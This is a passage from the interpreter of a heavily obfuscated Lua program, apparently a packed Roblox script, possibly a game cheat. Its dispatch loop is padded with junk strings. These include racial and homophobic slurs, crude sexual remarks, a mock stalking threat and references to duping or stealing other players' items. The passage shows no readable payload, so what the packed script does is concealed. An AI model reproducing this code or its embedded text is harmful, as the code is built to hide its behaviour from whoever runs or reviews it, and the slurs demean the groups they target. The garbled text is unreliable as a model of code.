n;M[e[s]]=l[e[h]];o=o+d;e=a[o];n=e[h];r=l[e[s]];l[n+1]=r;l[n]=r[e[D]];o=o+d;e=a[o];l[e[c]]=e[s];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[U]))o=o+d;e=a[o];n=e[t];r=l[e[s]];l[n+1]=r;l[n]=r[e[D]];o=o+d;e=a[o];l[e[i]]=e[U];o=o+d;e=a[o];n=e[b]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];n=e[b];r=l[e[w]];l[n+1]=r;l[n]=r[e[B]];o=o+d;e=a[o];l[e[t]]=e[f];o=o+d;e=a[o];n=e[t]l[n]=l[n](P(l,n+d,e[s]))break end;break;end break;end break;end break;end while(n)/((0x433+-27))==168 do n=(388244)while(91-(-48+0x7d))>=r do n-= n n=(2319684)while(50-0x27)>=r do n-= n n=(13781040)while((0x9c0/104)+-#'FranzJPresents')<r do n-= n l[e[h]]=e[x];break end while 3786==(n)/((0x79bf8/137))do local i=j[e[s]];local r;local d={};r=H({},{__index=function(o,e)local e=d[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=d[e]e[1][e[2]]=o;end;});for n=1,e[_]do o=o+u;local e=a[o];if e[(-73+0x4a)]==138 then d[n-1]={l,e[O]};else d[n-1]={y,e[s]};end;I[#I+1]=d;end;l[e[b]]=v(i,r,M);break end;break;end while(n)/((4764-0x983))==996 do n=(6586601)while(115-0x67)>=r do n-= n do return l[e[i]]end break;end while(n)/((-0x29+3978))==1673 do n=(649020)while r>(-#[[i have found your porn folder i am now approaching your house at 83 miles per hour]]+(278-0xb7))do n-= n local r;local n;l[e[t]][e[f]]=l[e[N]];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[x]))o=o+d;e=a[o];n=e[c];r=l[e[s]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[c]]={};o=o+d;e=a[o];l[e[c]][e[O]]=e[S];o=o+d;e=a[o];l[e[h]][e[w]]=e[N];o=o+d;e=a[o];l[e[b]][e[s]]=e[S];break end while(n)/(((67155/0xb9)+-#"howtodumpscript"))==1865 do local d=e[c];local n=l[d+2];local a=l[d]+n;l[d]=a;if(n>0)then if(a<=l[d+1])then o=e[U];l[d+3]=a;end elseif(a>=l[d+1])then o=e[O];l[d+3]=a;end break end;break;end break;end break;end while 3131==(n)/((-#"made by kim jong un"+(-0x67+246)))do n=(184248)while r<=(0x36-37)do n-= n n=(3944632)while(-#"Cause I know the way to get em motivated"+(0x101d/75))>=r do n-= n l[e[t]]=l[e[f]]-l[e[D]];break;end while 2602==(n)/((3145-0x65d))do n=(2537352)while r>((-0x79+4201)/255)do n-= n if not l[e[b]]then o=o+u;else o=e[s];end;break end while(n)/((0x4b940/224))==1836 do local e=e[k]local a,o=p(l[e]())m=o+e-d local o=0;for e=e,m do o=o+u;l[e]=a[o];end;break end;break;end break;end while 853==(n)/(((-143+0x2c)+315))do n=(131400)while r<=(60+-0x2a)do n-= n local r;local n;n=e[b];r=l[e[f]];l[n+1]=r;l[n]=r[e[N]];o=o+d;e=a[o];l[e[h]]=e[O];o=o+d;e=a[o];n=e[t]l[n]=l[n](P(l,n+d,e[s]))o=o+d;e=a[o];l[e[i]]=l[e[U]][e[C]];o=o+d;e=a[o];l[e[h]]=l[e[O]][e[B]];o=o+d;e=a[o];n=e[b];r=l[e[f]];l[n+1]=r;l[n]=r[e[D]];o=o+d;e=a[o];l[e[b]]={};o=o+d;e=a[o];l[e[b]]=M[e[f]];o=o+d;e=a[o];l[e[i]]=e[O];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[x]))o=o+d;e=a[o];l[e[k]]=M[e[x]];o=o+d;e=a[o];l[e[b]]=l[e[O]][e[B]];o=o+d;e=a[o];l[e[i]]();o=o+d;e=a[o];o=e[x];break;end while(n)/((-#"dot gg slash BKf6SjpfFv"+(0x180+-69)))==450 do n=(15780330)while r>(-28+0x2f)do n-= n l[e[h]]={};break end while(n)/((((-0x34+711373)/0xb7)+-#'sussy'))==4065 do local e=e[c]l[e]=l[e](l[e+u])break end;break;end break;end break;end break;end break;end while(n)/((0x13e4-2562))==187 do n=(739611)while(122+-0x5b)>=r do n-= n n=(5622771)while r<=(0x6f+-86)do n-= n n=(3593183)while r<=(-#[[real roblox omg builderman caught playing real]]+(0x64+-32))do n-= n n=(441084)while r>(127+-0x6a)do n-= n local n;local r;local x,c;local i;local n;n=e[k];i=l[e[f]];l[n+1]=i;l[n]=i[e[N]];o=o+d;e=a[o];l[e[k]]=e[f];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[U]))o=o+d;e=a[o];l[e[t]]=l[e[f]][e[D]];o=o+d;e=a[o];n=e[h];i=l[e[w]];l[n+1]=i;l[n]=i[e[_]];o=o+d;e=a[o];n=e[b]x,c=p(l[n](l[n+u]))m=c+n-d r=0;for e=n,m do r=r+d;l[e]=x[r];end;o=o+d;e=a[o];n=e[t]x={l[n](P(l,n+1,m))};r=0;for e=n,e[B]do r=r+d;l[e]=x[r];end o=o+d;e=a[o];o=e[O];break end while 534==(n)/((-122+0x3b4))do local e=e[t]l[e](P(l,e+u,m))break end;break;end while 2497==(n)/(((-#'Asses'+(0xc69-1644))+-89))do n=(8498831)while(0x7b+((-0x7e+49)+-#'dot gg slash BKf6SjpfFv'))>=r do n-= n local r;local n;n=e[c];r=l[e[s]];l[n+1]=r;l[n]=r[e[B]];o=o+d;e=a[o];l[e[t]]=e[s];o=o+d;e=a[o];n=e[i]l[n]=l[n](P(l,n+d,e[U]))o=o+d;e=a[o];l[e[h]]=l[e[U]][e[_]];o=o+d;e=a[o];l[e[i]]=l[e[f]][e[C]];o=o+d;e=a[o];n=e[c];r=l[e[f]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[k]]=M[e[U]];o=o+d;e=a[o];l[e[h]]=e[s];o=o+d;e=a[o];n=e[b]l[n](P(l,n+u,e[U]))o=o+d;e=a[o];l[e[i]]=M[e[s]];o=o+d;e=a[o];l[e[h]]=l[e[x]][e[D]];o=o+d;e=a[o];l[e[k]]();o=o+d;e=a[o];o=e[O];break;end while 2851==(n)/((-0x69+3086))do n=(7183350)while r>(0x1698/(0x8881/145))do n-= n local o=e[t]local a,e=p(l[o](P(l,o+1,e[U])))m=e+o-1 local e=0;for o=o,m do e=e+d;l[o]=a[e];end;break end while(n)/(((4635-0x91f)+-#'Bwomp'))==3130 do local r;local n;l[e[i]]=l[e[f]][e[N]];o=o+d;e=a[o];l[e[b]]=l[e[O]][e[S]];o=o+d;e=a[o];l[e[k]]=l[e[O]][e[C]];o=o+d;e=a[o];n=e[h];r=l[e[U]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[b]]=M[e[U]];o=o+d;e=a[o];n=e[c]l[n]=l[n]()o=o+d;e=a[o];l[e[c]]=l[e[x]][e[S]];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[f]))o=o+d;e=a[o];l[e[c]]=M[e[x]];o=o+d;e=a[o];l[e[h]]=l[e[x]][e[_]];o=o+d;e=a[o];l[e[t]]();o=o+d;e=a[o];o=e[s];break end;break;end break;end break;end while 3333==(n)/((3396-0x6ad))do n=(510831)while((0x79-81)+-#"Suck Sus0587")>=r do n-= n n=(8842080)while(0x58-62)>=r do n-= n local n;l[e[h]][e[s]]=l[e[_]];o=o+d;e=a[o];l[e[c]][e[w]]=e[D];o=o+d;e=a[o];n=e[t]l[n]=l[n](l[n+u])o=o+d;e=a[o];l[e[i]]=M[e[w]];o=o+d;e=a[o];n=e[b]l[n]=l[n]()o=o+d;e=a[o];l[e[b]][e[f]]=e[S];o=o+d;e=a[o];l[e[k]]=M[e[w]];o=o+d;e=a[o];n=e[t]l[n]=l[n]()o=o+d;e=a[o];l[e[k]][e[x]]=e[_];o=o+d;e=a[o];l[e[i]]=M[e[w]];break;end while(n)/((0xd6f+-59))==2616 do n=(1640320)while(126+-0x63)<r do n-= n l[e[i]]=M[e[f]];o=o+d;e=a[o];l[e[h]]=l[e[s]][e[N]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[N]];o=o+d;e=a[o];l[e[b]]=l[e[x]][e[_]];o=o+d;e=a[o];l[e[b]]=l[e[s]][e[D]];o=o+d;e=a[o];l[e[k]]=l[e[s]][e[_]];o=o+d;e=a[o];l[e[k]][e[s]]=l[e[_]];o=o+d;e=a[o];do return end;break end while 880==(n)/((-#"federal communication"+(407160/0xd8)))do l[e[b]]=y[e[U]];break end;break;end break;end while(n)/((4859-0x986))==211 do n=(1433985)while(377/(-#"abortion is a right dont take it away in the USA date 2022"+(217-0x92)))>=r do n-= n l[e[h]]=l[e[w]][e[C]];break;end while 735==(n)/((-#'11229901'+(-126+0x825)))do n=(3313105)while r>(-#"this code is skidded"+(-85+0x87))do n-= n do return end;break end while(n)/((-#[[Ok guys relax Theyre just fucking socks Its impossible for socks to turn me gay My heterosexuality will be fine dudes]]+(4484-0x8ca)))==1565 do l[e[b]]=M[e[w]];o=o+d;e=a[o];l[e[h]]=l[e[f]][e[S]];o=o+d;e=a[o];l[e[c]]=l[e[w]][e[_]];o=o+d;e=a[o];l[e[i]]=l[e[s]][e[B]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[S]];o=o+d;e=a[o];l[e[k]]=l[e[U]][e[C]];o=o+d;e=a[o];l[e[c]][e[O]]=l[e[N]];o=o+d;e=a[o];do return end;break end;break;end break;end break;end break;end while(n)/((816-0x1a3))==1863 do n=(2114190)while r<=(163-0x7f)do n-= n n=(1456452)while r<=(61+-0x1c)do n-= n n=(2177571)while((0xbd-128)+-#"Obfuscated By Obamas Left Nut")<r do n-= n l[e[t]][e[x]]=l[e[S]];break end while(n)/((0x5fe-775))==2869 do local i=j[e[x]];local r;local d={};r=H({},{__index=function(o,e)local e=d[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=d[e]e[1][e[2]]=o;end;});for n=1,e[D]do o=o+u;local e=a[o];if e[(0x17+-22)]==138 then d[n-1]={l,e[w]};else d[n-1]={y,e[x]};end;I[#I+1]=d;end;l[e[h]]=v(i,r,M);break end;break;end while 3518==(n)/((-56+0x1d6))do n=(13304172)while r<=(0x83+-97)do n-= n local r;local n;l[e[c]][e[O]]=l[e[N]];o=o+d;e=a[o];n=e[i]l[n](P(l,n+u,e[O]))o=o+d;e=a[o];n=e[t];r=l[e[w]];l[n+1]=r;l[n]=r[e[C]];o=o+d;e=a[o];l[e[t]]={};o=o+d;e=a[o];l[e[i]][e[x]]=e[N];o=o+d;e=a[o];l[e[i]][e[f]]=e[B];o=o+d;e=a[o];l[e[i]][e[s]]=e[S];break;end while(n)/(((0x75478/124)+-#'fix ownerof'))==3444 do n=(4295236)while(88+-0x35)<r do n-= n local n;l[e[i]]=M[e[x]];o=o+d;e=a[o];n=e[k]l[n]=l[n]()o=o+d;e=a[o];l[e[b]][e[w]]=l[e[S]];o=o+d;e=a[o];l[e[t]]=M[e[U]];o=o+d;e=a[o];l[e[i]]();o=o+d;e=a[o];do return end;break end while 2948==(n)/((0xb95-1508))do local a=e[k];local r=e[C];local n=a+2 local a={l[a](l[a+1],l[n])};for e=1,r do l[n+e]=a[e];end;local a=a[1]if a then l[n]=a o=e[U];else o=o+d;end;break end;break;end break;end break;end while 1251==(n)/((0x1b3b4/66))do n=(1938288)while(94+-0x37)>=r do n-= n n=(4183092)while(0x8e-105)>=r do n-= n if(l[e[h]]==e[_])then o=o+u;else o=e[U];end;break;end while(n)/((-87+0xabc))==1572 do n=(6307011)while r>(0xb8-146)do n-= n l[e[c]]=M[e[f]];o=o+d;e=a[o];l[e[b]]=l[e[x]][e[D]];o=o+d;e=a[o];l[e[c]]=l[e[s]][e[D]];o=o+d;e=a[o];l[e[k]]=l[e[O]][e[B]];o=o+d;e=a[o];l[e[k]]=l[e[w]][e[S]];o=o+d;e=a[o];l[e[t]]=l[e[x]][e[N]];o=o+d;e=a[o];l[e[i]][e[s]]=l[e[D]];o=o+d;e=a[o];do return end;break end while 3669==(n)/(((((0xe55+-43)+-#[[Nsrds GAYYYYAIAHAKAJAVAHAUA]])-1863)+-#'Impulse real 2022'))do local n;l[e[k]]=l[e[s]][e[B]];o=o+d;e=a[o];l[e[t]]=l[e[x]][e[_]];o=o+d;e=a[o];l[e[c]]=l[e[w]][e[N]];o=o+d;e=a[o];l[e[h]]=l[e[s]][e[N]];o=o+d;e=a[o];l[e[b]]=M[e[U]];o=o+d;e=a[o];l[e[c]]=l[e[U]][e[_]];o=o+d;e=a[o];l[e[i]]=e[f];o=o+d;e=a[o];l[e[i]]=e[f];o=o+d;e=a[o];l[e[t]]=e[f];o=o+d;e=a[o];n=e[k]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];l[e[b]][e[x]]=l[e[N]];o=o+d;e=a[o];o=e[s];break end;break;end break;end while 3671==(n)/((1093-0x235))do n=(5141835)while((0xc4+-117)+-#[[psx real dupe steal all ur pets no joke]])>=r do n-= n local d=e[k];local o=l[e[s]];l[d+1]=o;l[d]=o[e[B]];break;end while 1467==(n)/((-#"monobola"+(0xe03+-74)))do n=(255468)while r>((0x9d+-85)+-31)do n-= n local n;l[e[k]]=M[e[x]];o=o+d;e=a[o];n=e[h]l[n]=l[n]()o=o+d;e=a[o];l[e[k]][e[w]]=l[e[N]];o=o+d;e=a[o];l[e[c]]=M[e[O]];o=o+d;e=a[o];l[e[i]]();o=o+d;e=a[o];do return end;break end while 122==(n)/((-#'penis'+(-0x31+2148)))do if(l[e[k]]~=e[S])then o=o+u;else o=e[w];end;break end;break;end break;end break;end break;end break;end break;end while(n)/((2904-0x5bf))==2488 do n=(2085930)while(-#[[niggers]]+(146+-0x4c))>=r do n-= n n=(4227804)while r<=(5824/0x70)do n-= n n=(3997395)while r<=(0x7e-79)do n-= n n=(881063)while r<=(120-0x4c)do n-= n n=(3780680)while r>(78+-0x23)do n-= n local e=e[h]l[e]=l[e](P(l,e+d,m))break end while(n)/((0x101b+-101))==940 do l[e[i]]=l[e[s]][l[e[C]]];break end;break;end while(n)/((2948+-0x73))==311 do n=(6330900)while r<=(5400/0x78)do n-= n local n;l[e[h]]=l[e[w]][e[B]];o=o+d;e=a[o];l[e[t]]=l[e[O]][e[D]];o=o+d;e=a[o];l[e[t]]=l[e[x]][e[C]];o=o+d;e=a[o];l[e[h]]=l[e[x]][e[D]];o=o+d;e=a[o];l[e[c]]=M[e[x]];o=o+d;e=a[o];l[e[h]]=l[e[s]][e[C]];o=o+d;e=a[o];l[e[b]]=e[O];o=o+d;e=a[o];l[e[c]]=e[w];o=o+d;e=a[o];l[e[t]]=e[x];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[w]))o=o+d;e=a[o];l[e[i]][e[x]]=l[e[C]];o=o+d;e=a[o];o=e[x];break;end while(n)/((-50+0xb36))==2245 do n=(1151575)while r>(197-0x97)do n-= n if l[e[i]]then o=o+d;else o=e[f];end;break end while 365==(n)/((((-#[[anime is for fags]]+(0x326f-6497))-3229)+-#"tunnelposting"))do l[e[t]]=(e[w]~=0);o=o+u;break end;break;end break;end break;end while(n)/((1157+-0x66))==3789 do n=(2730004)while(-0x78+169)>=r do n-= n n=(1091200)while((213-0x93)+-#[[good googly moogly]])<r do n-= n local e=e[t]l[e]=l[e]()break end while(n)/((-#"I like watching videos of black men shaking their booty cheeks"+(0x77a7e/155)))==352 do local n;l[e[b]]=l[e[f]][e[_]];o=o+d;e=a[o];l[e[t]]=l[e[O]][e[_]];o=o+d;e=a[o];l[e[h]]=l[e[O]][e[D]];o=o+d;e=a[o];l[e[b]]=l[e[x]][e[N]];o=o+d;e=a[o];l[e[t]]=M[e[O]];o=o+d;e=a[o];l[e[k]]=l[e[w]][e[B]];o=o+d;e=a[o];l[e[i]]=e[w];o=o+d;e=a[o];l[e[h]]=e[U];o=o+d;e=a[o];l[e[c]]=e[U];o=o+d;e=a[o];n=e[t]l[n]=l[n](P(l,n+d,e[x]))o=o+d;e=a[o];l[e[b]][e[f]]=l[e[D]];break end;break;end while(n)/(((2188+-0x12)+-#[[Impulse real 2022]]))==1268 do n=(5557878)while r<=(110+-0x3c)do n-= n local n;l[e[k]]=M[e[U]];o=o+d;e=a[o];n=e[b]l[n]=l[n]()o=o+d;e=a[o];l[e[i]][e[s]]=l[e[B]];o=o+d;e=a[o];l[e[t]]=M[e[U]];o=o+d;e=a[o];l[e[c]]();o=o+d;e=a[o];do return end;break;end while 2658==(n)/((-61+0x868))do n=(91044)while r>(12954/0xfe)do n-= n do return end;break end while 81==(n)/((50580/0x2d))do local n;l[e[t]]=M[e[s]];o=o+d;e=a[o];n=e[i]l[n]=l[n]()o=o+d;e=a[o];l[e[h]][e[w]]=l[e[_]];o=o+d;e=a[o];l[e[h]]=M[e[s]];o=o+d;e=a[o];l[e[t]]();o=o+d;e=a[o];do return end;break end;break;end break;end break;end break;end while(n)/(((2571-0x530)+-#'real roblox omg builderman caught playing real'))==3532 do n=(5622956)while r<=((-0x65+165)+-#'gay men')do n-= n n=(2076866)while(0x1b6c/130)>=r do n-= n n=(1427580)while((0xd5-149)+-#'Pipe te amo')<r do n-= n if(l[e[h]]==l[e[_]])then o=o+u;else o=e[w];end;break end while(n)/((1092-0x241))==2772 do l[e[b]]=v(j[e[x]],nil,M);break end;break;end while(n)/((-95+0xb61))==737 do n=(9384180)while r<=((13108/0x74)+-#"abortion is a right dont take it away in the USA date 2022")do n-= n local e=e[b]l[e](l[e+u])break;end while 3180==(n)/((0x4dcf4/108))do n=(10131408)while(0x71+-57)<r do n-= n l[e[c]]=(e[O]~=0);break end while 3703==(n)/((-#"elbicho"+(2853+-0x6e)))do l[e[c]]=(e[O]~=0);break end;break;end break;end break;end while(n)/((-#[[fico éreto para mulheres japonesas]]+(0x957+-18)))==2404 do n=(5065500)while r<=(0x88-76)do n-= n n=(9689826)while(0x3a0/16)>=r do n-= n local r;local n;l[e[c]][e[w]]=l[e[_]];o=o+d;e=a[o];l[e[c]][e[w]]=l[e[_]];o=o+d;e=a[o];l[e[b]][e[w]]=e[B];o=o+d;e=a[o];l[e[b]][e[O]]=e[D];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[U]))o=o+d;e=a[o];n=e[i];r=l[e[O]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[t]]={};o=o+d;e=a[o];l[e[i]][e[f]]=e[D];o=o+d;e=a[o];l[e[c]][e[f]]=e[D];o=o+d;e=a[o];l[e[t]][e[U]]=e[D];break;end while 2609==(n)/((-56+0xeba))do n=(793485)while r>(0x98-(-48+0x8d))do n-= n local t;local s,S;local r;local n;l[e[c]]=M[e[U]];o=o+d;e=a[o];l[e[h]]=e[U];o=o+d;e=a[o];n=e[i]l[n](l[n+u])o=o+d;e=a[o];l[e[k]]=y[e[f]];o=o+d;e=a[o];n=e[h];r=l[e[w]];l[n+1]=r;l[n]=r[e[B]];o=o+d;e=a[o];n=e[k]l[n](l[n+u])o=o+d;e=a[o];l[e[k]]=y[e[x]];o=o+d;e=a[o];n=e[b];r=l[e[U]];l[n+1]=r;l[n]=r[e[N]];o=o+d;e=a[o];l[e[i]]=M[e[O]];o=o+d;e=a[o];l[e[c]]=l[e[O]][e[C]];o=o+d;e=a[o];n=e[b]s,S=p(l[n]())m=S+n-d t=0;for e=n,m do t=t+u;l[e]=s[t];end;o=o+d;e=a[o];n=e[b]l[n](P(l,n+u,m))o=o+d;e=a[o];do return end;break end while(n)/(((0x2b7-359)+-#"bring MoonSec v3 back"))==2519 do do return l[e[h]]end break end;break;end break;end while(n)/((((-0x55+-34)+1629)+-#"While true"))==3377 do n=(5546718)while r<=(3782/0x3e)do n-= n l[e[c]]=l[e[s]]-l[e[C]];break;end while(n)/(((0x3c644/134)+-#"If no father return milk end"))==3051 do n=(4258212)while(-#"If no milk then return ffather"+(0xda-126))<r do n-= n l[e[h]][e[f]]=l[e[N]];break end while 1956==(n)/((4446-0x8dd))do l[e[i]]();break end;break;end break;end break;end break;end break;end while 1155==(n)/((-#'number 15 you get no bitches'+(3711-((0x25db6/82)+-#'i love tatakai'))))do n=(12247504)while(-81+0x9b)>=r do n-= n n=(2379392)while r<=(0xe1-157)do n-= n n=(182685)while(0x55+-20)>=r do n-= n n=(437388)while(0x50+(0x58-104))<r do n-= n local o=e[c]local a,e=p(l[o]())m=e+o-d local e=0;for o=o,m do e=e+u;l[o]=a[e];end;break end while(n)/((0x11355/185))==1148 do l[e[h]]=M[e[f]];o=o+d;e=a[o];l[e[h]]=l[e[U]][e[D]];o=o+d;e=a[o];l[e[i]]=l[e[O]][e[S]];o=o+d;e=a[o];l[e[c]][e[U]]=l[e[D]];o=o+d;e=a[o];do return end;break end;break;end while 57==(n)/((6466-0xcbd))do n=(6053286)while r<=(-0x58+154)do n-= n M[e[x]]=l[e[t]];o=o+d;e=a[o];l[e[b]]={};o=o+d;e=a[o];l[e[b]]={};o=o+d;e=a[o];M[e[x]]=l[e[i]];o=o+d;e=a[o];l[e[h]]=M[e[x]];o=o+d;e=a[o];if(l[e[b]]==e[S])then o=o+u;else o=e[s];end;break;end while(n)/((0x2ac72/53))==1831 do n=(7161536)while((0x4608/249)+-#[[ballz]])<r do n-= n local a=e[c]local n={l[a](P(l,a+1,m))};local o=0;for e=a,e[_]do o=o+d;l[e]=n[o];end break end while(n)/(((6112-0xc0c)+-#"keno 0347 is a nerdy fag"))==2384 do o=e[w];break end;break;end break;end break;end while(n)/((0x63b00/220))==1282 do n=(7342337)while(187-0x74)>=r do n-= n n=(3914596)while r<=(0x2f7/11)do n-= n local r;local n;l[e[c]][e[x]]=l[e[_]];o=o+d;e=a[o];n=e[h]l[n](P(l,n+u,e[f]))o=o+d;e=a[o];n=e[t];r=l[e[s]];l[n+1]=r;l[n]=r[e[_]];o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[b]][e[x]]=e[S];o=o+d;e=a[o];l[e[i]][e[x]]=e[D];o=o+d;e=a[o];l[e[b]][e[w]]=e[S];break;end while(n)/((0x2d782/106))==2228 do n=(4146168)while r>(-0x6e+180)do n-= n l[e[k]][e[f]]=l[e[D]];o=o+d;e=a[o];l[e[c]]={};o=o+d;e=a[o];l[e[c]]=e[f];o=o+d;e=a[o];l[e[b]]=e[f];o=o+d;e=a[o];l[e[c]]=e[x];o=o+d;e=a[o];l[e[b]]=e[s];o=o+d;e=a[o];l[e[h]]=e[f];o=o+d;e=a[o];l[e[i]]=e[O];o=o+d;e=a[o];l[e[k]]=e[w];o=o+d;e=a[o];l[e[i]]=e[x];break end while 3562==(n)/((-#'mysecondegg'+(0x4f6+(-#'Faggot'+(-0x34-37)))))do local r;local n;l[e[i]][e[O]]=l[e[S]];o=o+d;e=a[o];n=e[t]l[n](P(l,n+u,e[x]))o=o+d;e=a[o];n=e[k];r=l[e[x]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[c]]={};o=o+d;e=a[o];l[e[h]][e[U]]=e[B];o=o+d;e=a[o];l[e[t]][e[U]]=e[S];o=o+d;e=a[o];l[e[t]][e[U]]=e[C];o=o+d;e=a[o];l[e[c]][e[w]]=e[C];o=o+d;e=a[o];l[e[t]][e[f]]=e[S];o=o+d;e=a[o];l[e[c]][e[U]]=e[S];break end;break;end break;end while(n)/(((-0x3b+2618)+-86))==2969 do n=(627102)while r<=(0x2910/146)do n-= n local n;l[e[t]]=M[e[O]];o=o+d;e=a[o];n=e[t]l[n]=l[n]()o=o+d;e=a[o];l[e[h]][e[w]]=l[e[B]];o=o+d;e=a[o];l[e[t]]=M[e[O]];o=o+d;e=a[o];l[e[h]]();o=o+d;e=a[o];do return end;break;end while(n)/((-#'Moonsex v5 eta'+(1154-0x24b)))==1134 do n=(7672156)while r>(247-0xae)do n-= n local e={l,e};e[u][e[g][c]]=e[d][e[g][S]]+e[u][e[g][f]];break end while 1874==(n)/((0x102d+-47))do l[e[b]][e[O]]=l[e[B]];o=o+d;e=a[o];l[e[i]]={};o=o+d;e=a[o];l[e[c]]=e[U];o=o+d;e=a[o];l[e[c]]=e[f];o=o+d;e=a[o];l[e[h]]=e[O];o=o+d;e=a[o];l[e[b]]=e[x];o=o+d;e=a[o];l[e[b]]=e[U];o=o+d;e=a[o];l[e[b]]=e[U];o=o+d;e=a[o];l[e[c]]=e[s];o=o+d;e=a[o];l[e[c]]=e[U];break end;break;end break;end break;end break;end while 3118==(n)/((7917-0xf95))do n=(4137250)while r<=(0xed/3)do n-= n n=(6735120)while(0x45c4/235)>=r do n-= n n=(83520)while(174+-0x63)<r do n-= n y[e[w]]=l[e[i]];break end while 696==(n)/((-#'If not skid then return hasbitches end'+(-69+0xe3)))do local r;local n;l[e[c]][e[x]]=l[e[S]];o=o+d;e=a[o];n=e[c]l[n](P(l,n+u,e[w]))o=o+d;e=a[o];n=e[h];r=l[e[s]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[h]]={};o=o+d;e=a[o];l[e[h]][e[w]]=e[N];break end;break;end while 2128==(n)/((0x18f4-3223))do n=(6871205)while r<=(-#'iPipeh i love You'+(-36+0x82))do n-= n local n;l[e[i]]=l[e[x]][e[D]];o=o+d;e=a[o];l[e[t]]=l[e[w]][e[S]];o=o+d;e=a[o];l[e[c]]=l[e[O]][e[N]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[C]];o=o+d;e=a[o];l[e[k]]=M[e[U]];o=o+d;e=a[o];l[e[b]]=l[e[x]][e[B]];o=o+d;e=a[o];l[e[t]]=e[U];o=o+d;e=a[o];l[e[i]]=e[x];o=o+d;e=a[o];l[e[k]]=e[w];o=o+d;e=a[o];n=e[t]l[n]=l[n](P(l,n+d,e[s]))o=o+d;e=a[o];l[e[c]][e[U]]=l[e[C]];o=o+d;e=a[o];o=e[f];break;end while 2981==(n)/((4635-0x91a))do n=(2758908)while r>((0x12d-174)+-#[[Innovative and Im made of rubber so that anything]])do n-= n local e=e[c]l[e](l[e+u])break end while(n)/((-#'suck my dicky giggas'+(212184/0x38)))==732 do local r;local n;l[e[t]]=l[e[U]][e[_]];o=o+d;e=a[o];l[e[t]]=l[e[O]][e[_]];o=o+d;e=a[o];l[e[i]]=l[e[O]][e[B]];o=o+d;e=a[o];n=e[k];r=l[e[w]];l[n+1]=r;l[n]=r[e[B]];o=o+d;e=a[o];n=e[i]l[n](l[n+u])o=o+d;e=a[o];l[e[k]]=M[e[U]];o=o+d;e=a[o];l[e[b]]=l[e[w]][e[B]];o=o+d;e=a[o];l[e[k]]();o=o+d;e=a[o];o=e[w];break end;break;end break;end break;end while(n)/(((((0x1d67d28/152)+-#[[fix ownerof]])/157)+-#[[luraph deobfuscator]]))==3250 do n=(4714569)while((-39+0x86)+-#"breathe   air")>=r do n-= n n=(4840000)while r<=(198-0x76)do n-= n local n;l[e[t]]=l[e[f]][e[B]];o=o+d;e=a[o];l[e[c]]=l[e[w]][e[D]];o=o+d;e=a[o];l[e[i]]=l[e[f]][e[B]];o=o+d;e=a[o];l[e[i]]=l[e[U]][e[D]];o=o+d;e=a[o];l[e[b]]=M[e[w]];o=o+d;e=a[o];l[e[b]]=l[e[O]][e[N]];o=o+d;e=a[o];l[e[h]]=e[x];o=o+d;e=a[o];l[e[t]]=e[U];o=o+d;e=a[o];l[e[i]]=e[s];o=o+d;e=a[o];n=e[c]l[n]=l[n](P(l,n+d,e[s]))o=o+d;e=a[o];l[e[k]][e[U]]=l[e[N]];o=o+d;e=a[o];o=e[f];break;end while 4000==(n)/((-47+0x4e9))do n=(2017305)while(15957/0xc5)<r do n-= n l[e[k]]={};break end while 2637==(n)/((0x60c-783))do local r;local n;l[e[t]][e[U]]=l[e[B]];o=o+d;e=a[o];n=e[i]l[n](P(l,n+u,e[f]))o=o+d;e=a[o];n=e[h];r=l[e[x]];l[n+1]=r;l[n]=r[e[S]];o=o+d;e=a[o];l[e[c]]={};o=o+d;e=a[o];l[e[i]][e[O]]=e[S];o=o+d;e=a[o];l[e[h]][e[w]]=e[D];o=o+d;e=a[o];l[e[b]][e[U]]=e[N];break end;break;end break;end while 1821==(n)/((0x1491-2676))do n=(2449224)while(-#[[Fucking losed 027728272728271]]+(0x101-145))>=r do n-= n l[e[i]][e[w]]=e[N];break;end while(n)/((7058-0xdd3))==696 do n=(5225470)while((-49+0xb4)+-#[[Hoo gah hooga hoo gahoo hoo gah hooga hoo gahoo]])<r do n-= n local n;l[e[i]]=e[O];o=o+d;e=a[o];l[e[c]]=e[U];o=o+d;e=a[o];n=e[h]l[n]=l[n](P(l,n+d,e[s]))o=o+d;e=a[o];l[e[i]][e[w]]=l[e[D]];o=o+d;e=a[o];l[e[b]][e[f]]=e[S];o=o+d;e=a[o];l[e[t]][e[s]]=e[B];o=o+d;e=a[o];l[e[i]][e[x]]=e[S];break end while 1810==(n)/((2958+-0x47))do l[e[h]]=y[e[s]];break end;break;end break;end break;end break;end break;end break;end break;end while 2514==(n)/((37312/0x40))do n=(979695)while(-#"nicuses dick is so good hot emoji here"+(-0x45+235))>=r do n-= n n=(4949424)while r<=(325-0xdb)do n-= n n=(6702687)while(-94+0xbd)>=r do n-= n n=(2557375)while(0x116-188)>=r do n-= n n=(574047)while(18879/0xd9)>=r do n-= n n=(13151268)while(-#"Asses"+(13195/0x91))<r do n-= n local k;local r;local h;local 